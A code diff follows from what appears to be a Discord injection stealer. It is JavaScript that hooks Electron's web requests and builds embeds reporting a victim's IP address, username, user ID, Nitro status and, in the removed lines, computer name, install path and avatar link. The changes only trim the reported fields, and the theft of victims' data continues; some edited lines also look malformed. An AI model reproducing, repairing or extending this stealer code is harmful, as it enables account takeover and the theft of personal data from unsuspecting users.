@@ -253,7 +253,7 @@ const FirstTime = async () => {
             title: "Initalized",
             fields: [{
                 name: "Info",
-                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                value: `\`IP: \n${ip}\n\`\`\``,
                 inline: !1
             }]
         })
@@ -272,7 +272,7 @@ const FirstTime = async () => {
             title: "Initalized",
             fields: [{
                 name: "Info",
-                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                value: `\`\P: \n${ip}\n\`\`\``,
                 inline: !1
             }, {
                 name: "Username <:username:1041634536733290596> ",
@@ -439,7 +439,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 color: config['embed-color'],
                 fields: [{
                     name: "Info",
-                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                    value: `\`IP: \n${ip}\n\`\`\``,
                     inline: !1
                 }, {
                     name: "Username <:username:1041634536733290596> ",
@@ -447,7 +447,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "ID <:iduser:1041634535395307520>",
-                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    value: `\`${user.id}\``,
                     inline: !0
                 }, {
                     name: "Nitro <a:nitro:1041639670288748634>",
